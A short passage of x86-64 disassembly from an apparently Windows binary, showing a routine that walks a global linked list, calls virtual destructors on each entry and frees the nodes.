   140009cbf:	cc                   	int3
   140009cc0:	40 53                	rex push %rbx
   140009cc2:	48 83 ec 20          	sub    $0x20,%rsp
   140009cc6:	eb 3d                	jmp    0x140009d05
   140009cc8:	48 8b 03             	mov    (%rbx),%rax
   140009ccb:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140009ccf:	48 89 05 22 93 00 00 	mov    %rax,0x9322(%rip)        # 0x140012ff8
   140009cd6:	48 8b 01             	mov    (%rcx),%rax
   140009cd9:	48 8b 40 10          	mov    0x10(%rax),%rax
   140009cdd:	ff 15 8d 08 00 00    	call   *0x88d(%rip)        # 0x14000a570
   140009ce3:	48 8b c8             	mov    %rax,%rcx
   140009ce6:	48 85 c0             	test   %rax,%rax
   140009ce9:	74 11                	je     0x140009cfc
   140009ceb:	48 8b 10             	mov    (%rax),%rdx
   140009cee:	48 8b 02             	mov    (%rdx),%rax
   140009cf1:	ba 01 00 00 00       	mov    $0x1,%edx
   140009cf6:	ff 15 74 08 00 00    	call   *0x874(%rip)        # 0x14000a570
   140009cfc:	48 8b cb             	mov    %rbx,%rcx
   140009cff:	ff 15 c3 06 00 00    	call   *0x6c3(%rip)        # 0x14000a3c8
   140009d05:	48 8b 1d ec 92 00 00 	mov    0x92ec(%rip),%rbx        # 0x140012ff8
   140009d0c:	48 85 db             	test   %rbx,%rbx
   140009d0f:	75 b7                	jne    0x140009cc8
   140009d11:	48 83 c4 20          	add    $0x20,%rsp
   140009d15:	5b                   	pop    %rbx
   140009d16:	c3                   	ret
